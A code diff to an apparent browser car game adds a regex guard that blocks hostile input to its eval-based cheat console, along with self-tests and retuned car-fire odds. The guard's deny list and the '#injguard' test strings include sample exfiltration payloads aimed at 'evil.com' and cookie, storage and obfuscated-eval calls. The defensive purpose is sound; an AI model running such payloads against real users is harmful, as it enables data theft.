@@ -398,6 +398,50 @@ function syncConsole() {
     consoleEl.blur();
   }
 }
+// ---- injection guard: the cheat console runs arbitrary JS by design, but
+// ONLY to poke THIS game in THIS tab. Anything that reaches for the network,
+// the disk, the clipboard, other windows, cookies, workers, or code-built-
+// from-strings is a hostile payload, not a cheat. We scan for it, REFUSE it,
+// and log the attempt so a shared build can't be turned into an attack
+// surface against whoever is playing.
+const INJECT_BANS = [
+  [/\bfetch\s*\(/i, 'network call (fetch)'],
+  [/XMLHttpRequest/i, 'network call (XHR)'],
+  [/\bWebSocket\b/i, 'network socket'],
+  [/\bEventSource\b/i, 'network stream'],
+  [/sendBeacon/i, 'beacon exfiltration'],
+  [/\brequire\s*\(/i, 'module require'],
+  [/\bimport\s*[('"`]/i, 'remote/dynamic import'],
+  [/\bimportScripts\b/i, 'script import'],
+  [/\bFunction\s*\(/i, 'code-from-string (Function)'],
+  [/\beval\s*\(/i, 'nested eval'],
+  [/showSaveFilePicker|showOpenFilePicker|showDirectoryPicker/i, 'file-system access'],
+  [/createWritable|FileSystemHandle/i, 'file write'],
+  [/document\s*\.\s*cookie/i, 'cookie access'],
+  [/\bindexedDB\b/i, 'database access'],
+  [/serviceWorker/i, 'service worker'],
+  [/\bWorker\s*\(|SharedWorker/i, 'background worker'],
+  [/window\s*\.\s*open|location\s*\.\s*(href|assign|replace)|\blocation\s*=/i, 'navigation / new window'],
+  [/navigator\s*\.\s*clipboard|execCommand\s*\(\s*['"]copy/i, 'clipboard access'],
+  [/localStorage|sessionStorage/i, 'storage tampering (use save/load)'],
+  [/geolocation|getUserMedia|mediaDevices/i, 'device / sensor access'],
+  [/postMessage|BroadcastChannel/i, 'cross-context messaging'],
+  [/\bWebAssembly\b/i, 'wasm load'],
+  [/\batob\s*\(|\bunescape\s*\(/i, 'obfuscated payload'],
+  [/<\s*script|innerHTML|insertAdjacentHTML|document\s*\.\s*write/i, 'HTML/script injection'],
+];
+let injectLog = [];
+function guardInjection(raw) {
+  for (const pair of INJECT_BANS) {
+    if (pair[0].test(raw)) {
+      injectLog.push({ label: pair[1], snippet: raw.slice(0, 60) });
+      if (injectLog.length > 40) injectLog.shift();
+      try { console.warn('INJECT BLOCKED [' + pair[1] + ']: ' + raw.slice(0, 90)); } catch (e) {}
+      return pair[1];
+    }
+  }
+  return null;
+}
 function runConsole(raw) {
   const cmd = raw.trim().toLowerCase();
   if (!cmd) return;
@@ -467,9 +511,18 @@ function runConsole(raw) {
   } else if (cmd === 'saves') {
     out = listSaves();
   } else {
-    // raw JS injection — this is your game, break it however you like
-    try { const r = eval(raw); out = r === undefined ? 'OK.' : String(r).slice(0, 90); }
-    catch (e) { out = 'ERR: ' + e.message; }
+    // raw JS injection — poke the game freely, but a payload that reaches
+    // OUTSIDE this tab (network, disk, clipboard, other windows) is refused
+    // and logged. This box is a cheat console, never an attack surface.
+    const bad = guardInjection(raw);
+    if (bad) {
+      out = 'BLOCKED — ' + bad + '. The console only affects THIS game, THIS session.';
+      cheated = true;                        // trying it still marks the run
+      sfx('fail');
+    } else {
+      try { const r = eval(raw); out = r === undefined ? 'OK.' : String(r).slice(0, 90); }
+      catch (e) { out = 'ERR: ' + e.message; }
+    }
   }
   consoleEl.placeholder = out;
   msg('CONSOLE: ' + out);
@@ -8369,10 +8422,24 @@ function update(dt) {
     else if (c.driver === 'mob') updMobCar(c, dt);
     else if (c.driver === null && (Math.abs(c.speed) > 2 || Math.abs(c.latV) > 2)) { c.speed *= Math.pow(0.2, dt); tireGrip(c, dt, 1); moveCar(c, dt); }
     if (c.onFireT > 0) {
-      c.onFireT -= dt;
+      // fire eats the car at 8 HP/s — whether it ever lets go depends on
+      // how hurt the metal already is:
+      //   healthy (>50% hp): it gets lucky — out within 4 seconds, tops
+      //   30..50% hp:        a real chance to self-extinguish
+      //   under 30 hp:       the fire usually WINS
+      //   under 20 hp:       it burns to the tank, no mercy
       carDamage(c, 8 * dt, c.fireBy);
-      if (!c.dead) addPart(c.x + rndf(-10, 10), c.y + rndf(-10, 10), rndf(1, 3), rndf(-10, 10), rndf(-10, 10), rndf(2, 5), rndf(0.2, 0.5), Math.random() < 0.6 ? 0xff8c1a : 0xffce3a, rndf(1, 2), true);
-    }
+      c.fireDur = (c.fireDur || 0) + dt;
+      if (!c.dead) {
+        addPart(c.x + rndf(-10, 10), c.y + rndf(-10, 10), rndf(1, 3), rndf(-10, 10), rndf(-10, 10), rndf(2, 5), rndf(0.2, 0.5), Math.random() < 0.6 ? 0xff8c1a : 0xffce3a, rndf(1, 2), true);
+        if (c.hp >= 20) {
+          const half9 = carMaxHp(c) * 0.5;
+          const outChance = c.hp > half9 ? 0.35 : (c.hp >= 30 ? 0.2 : 0.04);
+          if ((c.hp > half9 && c.fireDur >= 4) || Math.random() < outChance * dt) { c.onFireT = 0; c.fireDur = 0; }
+        }
+      }
+    } else c.fireDur = 0;
+    if (c.hp < 20 && !c.dead && c.onFireT <= 0) c.onFireT = 1;   // a burning wreck is LIT for good
     if (c.hp < 45 && !c.dead) {
       c.smokeT -= dt;
       if (c.smokeT <= 0) {
@@ -10914,6 +10981,74 @@ if (location.hash === '#finale') {
   startMission(0);
   const fin = mission && mission.lines && mission.lines.length === 5 && !!partner;
   console.log('FINDBG lastTable=' + fin + ' higherChain=' + (mission.lines[3].indexOf('HIGHER') >= 0));
+}
+if (location.hash === '#injguard') {
+  startGame();
+  const hostile = [
+    'fetch("http://evil.com/steal?c="+player.cash)',
+    'new WebSocket("ws://evil")',
+    'localStorage.clear()',
+    'document.cookie',
+    'window.open("http://evil")',
+    'new Function("return 1")()',
+    'eval(atob("payload"))',
+    'navigator.sendBeacon("/x", "data")',
+    'import("http://evil/mod.js")',
+    'document.body.innerHTML = ""',
+    'showSaveFilePicker()',
+    'new Worker("w.js")',
+  ];
+  let blockedAll = true;
+  for (const h9 of hostile) if (!guardInjection(h9)) { blockedAll = false; console.log('LEAKED: ' + h9); }
+  const legit = ['player.cash = 999', 'player.hp = 100', 'godMode = true', 'peds.length', 'mission && mission.type'];
+  let legitAllPass = true;
+  for (const l9 of legit) if (guardInjection(l9)) { legitAllPass = false; console.log('FALSEPOS: ' + l9); }
+  runConsole('fetch("http://evil")');
+  const runBlocks = (consoleEl.placeholder || '').indexOf('BLOCKED') === 0;
+  runConsole('player.cash = 4242');
+  const runAllows = player.cash === 4242;
+  console.log('INJGUARDDBG hostileAllBlocked=' + blockedAll + ' legitAllAllowed=' + legitAllPass + ' liveBlocks=' + runBlocks + ' liveAllows=' + runAllows + ' logged=' + (injectLog.length > 0));
+}
+if (location.hash === '#firechance') {
+  startGame();
+  godMode = true;
+  const litA = [];
+  for (let i = 0; i < 20; i++) {
+    const c9 = mkCar(player.x + 200 + (i % 5) * 60, player.y + Math.floor(i / 5) * 60, 0, 'sedan', null);
+    attachCarMesh(c9); cars.push(c9);
+    c9.onFireT = 2;
+    litA.push(c9);
+  }
+  for (let i = 0; i < 330; i++) update(1 / 60);   // 5.5s: past the 4s lucky cap
+  const healthyAllOut = litA.every(c9 => !c9.dead && c9.onFireT <= 0);
+  const healthyMinHp = Math.min(...litA.map(c9 => c9.hp));
+  const litC = [];
+  for (let i = 0; i < 12; i++) {
+    const c9 = mkCar(player.x + 200 + (i % 4) * 60, player.y + 260 + Math.floor(i / 4) * 60, 0, 'sedan', null);
+    attachCarMesh(c9); cars.push(c9);
+    c9.hp = 26;
+    c9.onFireT = 2;
+    litC.push(c9);
+  }
+  for (let i = 0; i < 420; i++) update(1 / 60);   // 7s: fire usually WINS down here
+  const lowMostlyBlow = litC.filter(c9 => c9.dead).length;
+  console.log('FIRECHDBG healthyAllOutBy4s=' + healthyAllOut + ' minHp=' + healthyMinHp.toFixed(0) + ' low26hpBlown=' + lowMostlyBlow + '/12 ok=' + (lowMostlyBlow >= 10));
+}
+if (location.hash === '#burnout') {
+  startGame();
+  const c9 = mkCar(player.x + 250, player.y, 0, 'sedan', null);
+  attachCarMesh(c9); cars.push(c9);
+  c9.onFireT = 2;                            // one lick of flame on a HEALTHY car
+  let t9 = 0;
+  while (c9.onFireT > 0 && !c9.dead && t9 < 30) { update(1 / 60); t9 += 1 / 60; }
+  const luckyOut = !c9.dead && c9.onFireT <= 0 && t9 <= 4.2;   // it gets lucky inside 4s
+  const c8 = mkCar(player.x + 400, player.y, 0, 'sedan', null);
+  attachCarMesh(c8); cars.push(c8);
+  c8.hp = 18;                                // beaten into the burning zone
+  let t8 = 0;
+  while (!c8.dead && t8 < 10) { update(1 / 60); t8 += 1 / 60; }
+  const wreckBlows = c8.dead;
+  console.log('BURNDBG healthyLuckyOut=' + luckyOut + ' in=' + t9.toFixed(1) + 's lowHpWreckBlows=' + wreckBlows + ' in=' + t8.toFixed(1) + 's');
 }
 if (location.hash === '#blast') {
   startGame();
